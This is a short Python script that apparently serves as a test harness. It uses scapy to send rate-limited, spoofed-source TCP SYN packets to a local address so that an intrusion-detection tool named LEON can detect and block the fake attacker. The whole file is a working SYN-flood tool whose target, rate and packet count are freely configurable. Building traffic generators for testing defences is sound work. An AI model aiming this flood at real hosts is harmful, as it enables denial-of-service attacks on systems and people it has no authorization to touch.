#!/usr/bin/env python3
"""Small SYN flood for same-machine LEON testing.

Sends spoofed-source SYN packets to the local wlan0 IP.
LEON captures on wlan0, detects ANOMALY, blocks the fake attacker IP.

Usage:
  sudo .venv/bin/python3 scripts/ddos_flood.py
  sudo .venv/bin/python3 scripts/ddos_flood.py --target 10.200.130.91 --src 10.200.130.99 --port 80 --count 2000 --rate 500

Safety:
  - Spoofed source IP = non-existent device (no real impact)
  - Auto-stops after --count packets
  - Rate-limited to avoid saturating the WiFi link
"""
from __future__ import annotations

import argparse
import sys
import time

try:
    from scapy.all import IP, TCP, send, conf
except ImportError:
    print("Error: scapy not installed. Run: .venv/bin/pip install scapy")
    sys.exit(1)

conf.verb = 0


def main() -> int:
    parser = argparse.ArgumentParser(description="SYN flood for LEON testing (spoofed source)")
    parser.add_argument("--target", default="10.200.130.91",
                        help="target IP (your wlan0 IP)")
    parser.add_argument("--src", default="10.200.130.99",
                        help="spoofed source IP (fake attacker)")
    parser.add_argument("--port", type=int, default=80,
                        help="target port (default: 80)")
    parser.add_argument("--count", type=int, default=2000,
                        help="number of SYN packets (default: 2000)")
    parser.add_argument("--rate", type=int, default=500,
                        help="packets per second (default: 500)")
    args = parser.parse_args()

    duration = args.count / args.rate
    print(f"SYN flood: {args.count} packets -> {args.target}:{args.port}")
    print(f"  spoofed src={args.src}  rate={args.rate} pps  duration=~{duration:.0f}s")
    print()

    start = time.monotonic()
    for i in range(args.count):
        pkt = IP(src=args.src, dst=args.target) / TCP(dport=args.port, flags="S")
        send(pkt)

        if (i + 1) % 500 == 0:
            elapsed = time.monotonic() - start
            print(f"  [{elapsed:5.1f}s] sent {i+1}/{args.count} packets")

        # rate limit
        expected = (i + 1) / args.rate
        actual = time.monotonic() - start
        if actual < expected:
            time.sleep(expected - actual)

    elapsed = time.monotonic() - start
    print(f"\nDone. {args.count} packets sent in {elapsed:.1f}s")
    print(f"Check LEON terminal for [BLOCK] events.")
    print(f"Verify: nft list set ip leon blocked")
    return 0


if __name__ == "__main__":
    sys.exit(main())
